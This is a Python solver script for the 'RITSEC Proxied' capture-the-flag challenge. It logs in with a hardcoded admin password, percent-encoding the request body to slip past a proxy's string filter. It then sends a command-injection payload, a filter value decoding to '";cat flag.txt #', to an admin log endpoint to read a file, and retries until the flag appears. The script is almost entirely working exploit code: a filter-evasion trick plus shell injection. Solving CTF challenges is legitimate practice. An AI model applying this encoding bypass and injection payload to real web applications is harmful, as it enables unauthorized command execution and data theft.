#!/usr/bin/env python3
import argparse
import re
import sys
import time

import requests


def get_token(session: requests.Session, base: str, timeout: float) -> str | None:
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
    # Proxy checks raw body with strstr and does not URL-decode before filtering.
    body = "username=%61dmin&password=t0p5ecr3tp%40ss"
    r = session.get(f"{base}/login", data=body, headers=headers, timeout=timeout)
    if r.status_code != 200:
        return None
    token = r.text.strip()
    if re.fullmatch(r"[0-9a-f]{16}", token):
        return token
    return None


def read_flag(session: requests.Session, base: str, token: str, timeout: float) -> str | None:
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
    # Decodes to: filter='";cat flag.txt #'
    # Raw body keeps 'f%6cag.txt' to evade proxy check for literal 'flag.txt'.
    body = f"username=%61dmin&token={token}&filter=%22;cat%20f%6cag.txt%20%23"
    r = session.get(f"{base}/admin/readlog", data=body, headers=headers, timeout=timeout)
    if r.status_code != 200:
        return None

    m = re.search(r"RS\{[^\r\n]*\}", r.text)
    if m:
        return m.group(0)
    return None


def main() -> int:
    ap = argparse.ArgumentParser(description="RITSEC Proxied solver")
    ap.add_argument("--url", default="https://proxied.ctf.ritsec.club", help="Base URL")
    ap.add_argument("--retries", type=int, default=30, help="Retry attempts")
    ap.add_argument("--timeout", type=float, default=15.0, help="Per-request timeout")
    ap.add_argument("--sleep", type=float, default=1.0, help="Sleep between retries")
    args = ap.parse_args()

    base = args.url.rstrip("/")

    with requests.Session() as sess:
        for i in range(1, args.retries + 1):
            try:
                tok = get_token(sess, base, args.timeout)
                if not tok:
                    print(f"[{i}] login failed")
                else:
                    print(f"[{i}] token={tok}")
                    flag = read_flag(sess, base, tok, args.timeout)
                    if flag:
                        print(flag)
                        return 0
                    print(f"[{i}] readlog failed")
            except requests.RequestException as e:
                print(f"[{i}] network error: {e}")
            time.sleep(args.sleep)

    print("flag not found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
